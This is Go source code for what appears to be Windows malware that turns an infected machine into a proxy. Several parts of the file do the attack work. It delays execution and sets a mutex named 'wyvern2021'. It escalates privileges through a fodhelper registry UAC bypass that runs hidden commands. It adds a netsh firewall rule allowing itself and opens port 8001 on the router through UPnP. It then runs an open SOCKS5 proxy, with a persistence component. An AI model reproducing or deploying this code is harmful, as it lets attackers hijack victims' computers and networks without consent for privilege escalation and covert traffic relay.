package main

import (
	"context"
	crand "crypto/rand"
	"fmt"
	"math"
	"math/big"
	"math/rand"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"github.com/NebulousLabs/go-upnp"
	"github.com/armon/go-socks5"
	"golang.org/x/sys/windows/registry"
)

func main() {
	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
	rand.Seed(seed.Int64())
	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
	if _, err := CreateMutex("wyvern2021"); err != nil {
		return
	}
	err := BypassFirewall()
	if err != nil {
		return
	}
	BypassNAT()

	var config Config
	var persistence Persistence
	err = config.Init()
	if err != nil {
		return
	}
	err = persistence.Init(config)
	if err != nil {
		return
	}
	for {
		err = mainFunc(config)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 10)
	}
}

func BypassFirewall() error {
	filename, err := os.Executable()
	if err != nil {
		return err
	}
	err = UacBypass(`netsh advfirewall firewall delete rule name="_____p2p"`)
	if err != nil {
		return err
	}
	err = UacBypass(`netsh advfirewall firewall add rule name="_____p2p" dir=in program="` +
		filename + `" profile=any action=allow`)
	if err != nil {
		return err
	}
	err = UacBypass("")
	return err
}

func BypassNAT() {
	ctx, cancel := context.WithTimeout(context.Background(), time.Hour)
	defer cancel()
	d, err := upnp.DiscoverCtx(ctx)
	if err != nil {
		return
	}
	err = d.Forward(8001, "socks5")
	if err != nil {
		return
	}
}

func UacBypass(cmd string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER,
		`Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	if err := key.SetStringValue("", cmd); err != nil {
		return err
	}
	if err := key.Close(); err != nil {
		return err
	}
	ins := exec.Command("cmd", "fodhelper")
	ins.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = ins.Run()
	return err
}

func CreateMutex(name string) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex := kernel32.NewProc("CreateMutexW")
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
	)
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}

func SocksServer(config Config, ch chan bool) {
	exit := false
	go func() {
		exit = <-ch
	}()
	for {
		if exit {
			return
		}
		conf := &socks5.Config{}
		server, err := socks5.New(conf)
		if err != nil {
			time.Sleep(time.Second * 10)
			continue
		}

		if err := server.ListenAndServe("tcp", "0.0.0.0:8001"); err != nil {
			time.Sleep(time.Second * 10)
			continue
		}
	}
}

func mainFunc(config Config) error {
	ch := make(chan bool)
	go SocksServer(config, ch)
	var handler Handler
	err := handler.Init(config)
	ch <- true
	return err
}
